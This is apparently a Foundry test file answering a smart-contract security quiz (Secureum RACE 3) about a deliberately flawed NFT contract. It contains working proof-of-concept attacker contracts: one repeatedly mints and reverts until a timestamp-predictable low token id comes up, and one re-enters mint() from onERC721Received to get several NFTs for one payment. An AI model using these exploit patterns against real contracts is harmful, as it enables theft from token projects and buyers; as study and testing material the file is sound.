// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { InSecureumNFT, ERC721TokenReceiver } from "../src/Race3.sol";

contract InSecureumNFTTestBase is Test {
    InSecureumNFT nft;
    address payable benificiary = payable(makeAddr("benificiary"));

    function setUp() public virtual {
        nft = new InSecureumNFT(benificiary);
    }
}

// NOTE Q1 does not require tests

contract R3_Q2_ERC721TokenReceiver is ERC721TokenReceiver {
    InSecureumNFT nft;
    constructor(address _nft) payable {
        nft = InSecureumNFT(_nft);
    }

    function onERC721Received(  address _operator, 
                                address _from, 
                                uint256 _tokenId, 
                                bytes calldata _data) external returns(bytes4) {
        bytes4 retval = 0x11223344;
        return retval;                                    
    }

    function buyNFT(uint price) public returns(uint) {
        uint id = nft.mint{value: price}();
        // console.log("NFT: ", id);
        require(id < 3, "NFT not valuable enough");
        return id;
    }

    receive() external payable {}
}

contract R3_Q2 is InSecureumNFTTestBase {
    uint INIT_SALE_PRICE = 10000;
    R3_Q2_ERC721TokenReceiver buyerContract;

    function setUp() public override {
        // set to current timestamp on ethereum mainnet
        vm.warp(1725355264);
        super.setUp();
        nft.startSale(INIT_SALE_PRICE);
        // deploy the buyer contract with some ether so it can buy some NFTs
        buyerContract = new R3_Q2_ERC721TokenReceiver{value: 1 ether}(address(nft));
    }

    function test_BuyersCanRepeatedlyMintAndRevertUntilTheyReceiveDesiredNFT() public {
        // the following could be performed in a script by an attacker...

        // if we mint now it will generate an NFT id which is too high (not valueable enough)
        vm.expectRevert("NFT not valuable enough");
        buyerContract.buyNFT(INIT_SALE_PRICE);
        
        // if we wait until 1725355300 it will still generate an NFT id which is too high (not valueable enough)
        vm.warp(1725355300);
        vm.expectRevert("NFT not valuable enough");
        buyerContract.buyNFT(INIT_SALE_PRICE);

        // if we mint at exactly 1725355333 then we get NFT ID 1
        vm.warp(1725355333);
        uint currentPrice = nft.getPrice();
        uint id = buyerContract.buyNFT(INIT_SALE_PRICE);
        assertEq(id, 1);

        // benefitial has only recived one sales worth of ether
        assertEq(benificiary.balance, currentPrice);
    }
}

// NOTE Q3 does not require tests

contract R3_Q4_Reentrancy is ERC721TokenReceiver {
    InSecureumNFT nft;
    uint price;
    uint buyCount = 1;
    constructor(address _nft, uint _price) payable {
        nft = InSecureumNFT(_nft);
        price = _price;
    }

    function onERC721Received(  address _operator, 
                                address _from, 
                                uint256 _tokenId, 
                                bytes calldata _data) external returns(bytes4) {
        bytes4 retval = 0x11223344;
        buyCount +=1;
        // console.log("buyCount: ", buyCount);
        if(buyCount < nft.SALE_LIMIT()) {
            // reenter nft contract here to keep buying more NFT without paying more
            uint id = nft.mint();
            console.log(id);
        }
        return retval;
    }

    function attack() public returns(uint) {
        uint id = nft.mint{value: price}();
        return id;
    }

    receive() external payable {}
}

contract R3_Q4 is InSecureumNFTTestBase {
    uint INIT_SALE_PRICE = 10000;
    R3_Q4_Reentrancy attackerContract;

    function setUp() public override {
        super.setUp();
        nft.startSale(INIT_SALE_PRICE);
        // deploy the attacker contract with some ether so it can buy some NFTs
        attackerContract = new R3_Q4_Reentrancy{value: 1 ether}(address(nft), INIT_SALE_PRICE);
    }
    function test_SusceptibleToReentrancyDuringMinting() public {
        attackerContract.attack();
        // assert that have multiple nfts for the price of one
    }
}